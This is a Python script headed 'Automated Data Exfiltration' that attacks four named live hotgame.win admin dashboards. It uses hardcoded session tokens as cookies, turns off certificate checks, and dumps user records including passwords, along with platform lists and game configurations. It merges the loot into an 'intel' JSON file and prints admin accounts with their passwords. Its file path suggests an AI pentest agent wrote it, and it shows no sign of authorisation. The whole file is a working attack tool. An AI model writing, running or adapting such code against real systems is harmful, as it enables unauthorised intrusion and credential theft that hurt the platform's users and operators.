#!/usr/bin/env python3
"""
Multi-Dashboard Scraper - Automated Data Exfiltration
======================================================
Targets: 4 live hotgame.win admin dashboards
Actions: User dump, platform inventory, game configs
Output: FINAL_MERGED_INTEL.json
"""

import json
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Any, Optional
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# TARGET CONFIGURATION - Using KNOWN WORKING TOKENS
# ============================================================

TARGETS = [
    {
        "name": "dashboard.f1",
        "url": "https://dashboard.f1.hotgame.win",
        "token": "91b7b43c-f7da-4593-81f1-7b956cce6039"
    },
    {
        "name": "dashboard.f2",
        "url": "https://dashboard.f2.hotgame.win",
        "token": "eeb7ee7f-2b4e-46ef-9422-f67624aa379c"
    },
    {
        "name": "dashboard.s1",
        "url": "https://dashboard.s1.hotgame.win",
        "token": "8d5755c4-9a49-4747-90dc-7e4e030f6306"
    },
    {
        "name": "dashboard.s2",
        "url": "https://dashboard.s2.hotgame.win",
        "token": "606e94da-b24b-4ced-aaa0-c1fac959e72f"
    }
]

# Common headers
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

# ============================================================
# SCRAPER CLASS
# ============================================================

class DashboardScraper:
    def __init__(self, target: Dict):
        self.target = target
        self.name = target["name"]
        self.base_url = target["url"]
        self.token = target["token"]
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(HEADERS)
        self.session.cookies.set("JSESSIONID", self.token, domain=self.base_url.replace("https://", ""))
        self.data = {
            "users": [],
            "platforms": [],
            "games": {},
            "errors": []
        }
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[Dict]:
        url = f"{self.base_url}{endpoint}"
        try:
            resp = self.session.request(method, url, timeout=20, **kwargs)
            if resp.status_code == 200:
                return resp.json()
            else:
                return {"_error": True, "status": resp.status_code, "body": resp.text[:300]}
        except Exception as e:
            return {"_exception": True, "error": str(e)}
    
    def dump_users(self) -> List[Dict]:
        print(f"  [{self.name}] Dumping users...")
        result = self._request("POST", "/api/UserController/list", 
                              json={"page": 1, "pageSize": 10000})
        
        if result and isinstance(result, dict) and not result.get("_error") and not result.get("_exception"):
            rows = result.get("data", {}).get("rows", [])
            print(f"    -> Got {len(rows)} users")
            return rows
        else:
            err = result.get("_exception") or result.get("body") or result.get("status") or "Unknown error"
            print(f"    -> FAILED: {err}")
            return []
    
    def dump_platforms(self) -> List[Dict]:
        print(f"  [{self.name}] Dumping platforms...")
        result = self._request("GET", "/api/UserController/user/person")
        
        if result and isinstance(result, dict) and not result.get("_error") and not result.get("_exception"):
            platforms = result.get("data", {}).get("platformList", [])
            print(f"    -> Got {len(platforms)} platforms")
            return platforms
        else:
            err = result.get("_exception") or result.get("body") or result.get("status") or "Unknown error"
            print(f"    -> FAILED: {err}")
            return []
    
    def dump_game_configs(self, platform_ids: List[str]) -> Dict[str, List[Dict]]:
        games = {}
        print(f"  [{self.name}] Dumping game configs for {len(platform_ids)} platforms...")
        
        for pid in platform_ids:
            result = self._request("GET", f"/api/SysGameDataController/listGames?platformId={pid}&page=1&pageSize=100")
            
            if result and isinstance(result, dict) and not result.get("_error") and not result.get("_exception"):
                game_list = result.get("data", [])
                if isinstance(game_list, dict):
                    game_list = game_list.get("rows", game_list.get("data", []))
                if game_list:
                    games[pid] = game_list
                    print(f"    -> Platform {pid}: {len(game_list)} games")
                else:
                    print(f"    -> Platform {pid}: 0 games")
            else:
                print(f"    -> Platform {pid}: FAILED")
            
            time.sleep(0.1)
        
        return games
    
    def run(self):
        print(f"\n{'='*60}")
        print(f"STARTING: {self.name} ({self.base_url})")
        print(f"{'='*60}")
        
        # 1. Dump users
        self.data["users"] = self.dump_users()
        
        # 2. Dump platforms
        platforms = self.dump_platforms()
        self.data["platforms"] = platforms
        
        # 3. Dump game configs
        platform_ids = [str(p.get("id")) for p in platforms if p.get("id")]
        if platform_ids:
            self.data["games"] = self.dump_game_configs(platform_ids)
        else:
            self.data["games"] = {}
        
        print(f"\n[{self.name}] COMPLETE")
        print(f"  Users: {len(self.data['users'])}")
        print(f"  Platforms: {len(platforms)}")
        print(f"  Game configs: {len(self.data['games'])} platforms")
        
        return self.data


def merge_results(all_results: Dict[str, Dict]) -> Dict:
    print("\n" + "="*60)
    print("MERGING RESULTS")
    print("="*60)
    
    # Merge users (deduplicate by account)
    all_users = {}
    for name, data in all_results.items():
        for u in data.get("users", []):
            key = u.get("account")
            if key and key not in all_users:
                all_users[key] = {
                    "account": u.get("account"),
                    "password": u.get("password"),
                    "nickName": u.get("nickName"),
                    "userType": u.get("userType"),
                    "admin": u.get("admin", False),
                    "commonStatus": u.get("commonStatus"),
                    "createTime": u.get("createTime"),
                    "valid": u.get("valid"),
                    "id": u.get("id"),
                    "seen_on": [name]
                }
            elif key:
                if name not in all_users[key]["seen_on"]:
                    all_users[key]["seen_on"].append(name)
    
    # Merge platforms
    all_platforms = {}
    for name, data in all_results.items():
        for p in data.get("platforms", []):
            pid = str(p.get("id"))
            if pid and pid not in all_platforms:
                all_platforms[pid] = p
                all_platforms[pid]["seen_on"] = [name]
            elif pid:
                if name not in all_platforms[pid]["seen_on"]:
                    all_platforms[pid]["seen_on"].append(name)
    
    # Merge games
    all_games = {}
    for name, data in all_results.items():
        for pid, games in data.get("games", {}).items():
            if pid not in all_games:
                all_games[pid] = []
            for g in games:
                gid = g.get("id") or g.get("gameCode") or g.get("gameName")
                if gid and not any(x.get("id") == gid or x.get("gameCode") == gid for x in all_games[pid]):
                    g["source_dashboard"] = name
                    all_games[pid].append(g)
    
    # Find admin accounts
    admin_accounts = [u for u in all_users.values() if u.get("admin")]
    
    return {
        "timestamp": datetime.now().isoformat() + "Z",
        "total_unique_users": len(all_users),
        "total_unique_platforms": len(all_platforms),
        "total_game_configs": sum(len(g) for g in all_games.values()),
        "dashboards_scraped": list(all_results.keys()),
        "admin_accounts": admin_accounts,
        "all_users": list(all_users.values()),
        "all_platforms": list(all_platforms.values()),
        "all_games": all_games,
        "per_dashboard_stats": {
            name: {
                "users": len(data.get("users", [])),
                "platforms": len(data.get("platforms", [])),
                "game_configs": len(data.get("games", {})),
                "errors": data.get("errors", [])
            }
            for name, data in all_results.items()
        }
    }


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     MULTI-DASHBOARD SCRAPER - RED TEAM AUTOMATION            ║
║     Target: 4 hotgame.win admin dashboards                   ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    start_time = time.time()
    all_results = {}
    
    # Run scrapers in parallel
    with ThreadPoolExecutor(max_workers=4) as executor:
        future_to_name = {}
        for target in TARGETS:
            scraper = DashboardScraper(target)
            future = executor.submit(scraper.run)
            future_to_name[future] = target["name"]
        
        for future in as_completed(future_to_name):
            name = future_to_name[future]
            try:
                result = future.result()
                all_results[name] = result
            except Exception as e:
                print(f"[{name}] EXCEPTION: {e}")
                all_results[name] = {"users": [], "platforms": [], "games": {}, "errors": [str(e)]}
    
    # Merge all results
    merged = merge_results(all_results)
    
    # Save FINAL_MERGED_INTEL.json
    output_path = "/home/kali/Desktop/Agant/PentestAI-Unified/FINAL_MERGED_INTEL.json"
    with open(output_path, "w") as f:
        json.dump(merged, f, indent=2, ensure_ascii=False)
    
    # Print summary
    elapsed = time.time() - start_time
    print("\n" + "="*60)
    print("SCRAPING COMPLETE")
    print("="*60)
    print(f"Time elapsed: {time.time() - start_time:.1f}s")
    print(f"Total unique users: {merged['total_unique_users']}")
    print(f"Total unique platforms: {merged['total_unique_platforms']}")
    print(f"Total game configs: {merged['total_game_configs']}")
    print(f"\nAdmin accounts found: {len(merged['admin_accounts'])}")
    for admin in merged['admin_accounts']:
        print(f"  - {admin['account']} | pass: {admin['password']} | type: {admin['userType']} | seen: {admin['seen_on']}")
    
    print(f"\nPer-dashboard breakdown:")
    for name, stats in merged['per_dashboard_stats'].items():
        print(f"  {name}: {stats['users']} users, {stats['platforms']} platforms, {stats['game_configs']} game configs")
        if stats['errors']:
            print(f"    Errors: {stats['errors']}")
    
    print(f"\nOutput saved to: /home/kali/Desktop/Agant/PentestAI-Unified/FINAL_MERGED_INTEL.json")
    print("="*60)


if __name__ == "__main__":
    main()